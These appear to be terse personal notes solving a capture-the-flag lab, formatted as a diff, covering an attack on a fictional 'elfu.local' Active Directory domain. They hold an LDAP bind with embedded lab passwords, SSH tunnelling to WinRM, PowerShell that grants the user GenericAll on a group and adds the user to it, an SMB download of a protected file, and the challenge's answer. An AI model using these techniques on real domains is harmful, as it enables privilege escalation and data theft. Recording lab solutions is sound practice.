+>>> from ldap3 import Server,Connection,ALL,NTLM
+>>> serverName = "dc01.elfu.local"
+>>> connUser = "elfu.local\\remote_elf"
+>>> connUserPwd="A1d655f7f5d98b10!"
+>>> server = Server(serverName, get_info=ALL)
+>>> conn = Connection(server, user = connUser,password=connUserPwd,authentication=NTLM)
+>>> conn.bind()
+
+WHOMP WHOMP
+
+
+this is dumb
+WSL > ssh -L 50666:10.128.1.53:5985 jtphrtgkqt@grades.elfu.org -p 2222
+WIN > PS C:\Users\blake> $cred = Get-Credential
+
+cmdlet Get-Credential at command pipeline position 1
+Supply values for the following parameters:
+Credential
+PS C:\Users\blake> enter-pssession localhost -port 50666 -Credential $cred
+[localhost]: PS C:\Users\remote_elf\Documents>
+
+do it all over in the morning...
+okay i didn't even need to do that
+PS /home/nvfffnnpkr> enter-pssession 10.128.1.53 -Credential $cred
+
+Add-Type -AssemblyName System.DirectoryServices
+$ldapConnString = "LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
+$username = "nvfffnnpkr"
+$nullGUID = [guid]'00000000-0000-0000-0000-000000000000'
+$propGUID = [guid]'00000000-0000-0000-0000-000000000000'
+$IdentityReference = (New-Object System.Security.Principal.NTAccount("elfu.local\$username")).Translate([System.Security.Principal.SecurityIdentifier])
+$inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
+$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule ($IdentityReference,([System.DirectoryServices.ActiveDirectoryRights] "GenericAll"),([System.Security.AccessControl.AccessControlType] "Allow"),$propGUID,$inheritanceType,$nullGUID)
+$domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString
+$secOptions = $domainDirEntry.get_Options()
+$secOptions.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl
+$domainDirEntry.RefreshCache()
+$domainDirEntry.get_ObjectSecurity().AddAccessRule($ACE)
+$domainDirEntry.CommitChanges()
+$domainDirEntry.dispose()
+
+
+Add-Type -AssemblyName System.DirectoryServices
+$ldapConnString = "LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
+$username = "nvfffnnpkr"
+$password = "Uxoglgtft@"
+$domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString, $username, $password
+$user = New-Object System.Security.Principal.NTAccount("elfu.local\$username")
+$sid = $user.Translate([System.Security.Principal.SecurityIdentifier])
+$b=New-Object byte[] $sid.BinaryLength
+$sid.GetBinaryForm($b,0)
+$hexSID=[BitConverter]::ToString($b).Replace('-','')
+$domainDirEntry.Add("LDAP://<SID=$hexSID>")
+$domainDirEntry.CommitChanges()
+$domainDirEntry.dispose()
+
+nvfffnnpkr@grades:~$ smbclient \\\\10.128.3.30\\research_dep -W elfu.local -U nvfffnnpkr
+Enter ELFU.LOCAL\nvfffnnpkr's password:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Thu Dec  2 16:39:42 2021
+  ..                                  D        0  Wed Dec 22 08:01:33 2021
+  SantaSecretToAWonderfulHolidaySeason.pdf      N   173932  Thu Dec  2 16:38:26 2021
+
+                41089256 blocks of size 1024. 34791904 blocks available
+smb: \> get SantaSecretToAWonderfulHolidaySeason.pdf
+getting file \SantaSecretToAWonderfulHolidaySeason.pdf of size 173932 as SantaSecretToAWonderfulHolidaySeason.pdf (56616.6 KiloBytes/sec) (average 56618.5 KiloBytes/sec)
+smb: \> exit
+nvfffnnpkr@grades:~$ ls
+SantaSecretToAWonderfulHolidaySeason.pdf
+
+scp out
+
+Challenge answer: kindness
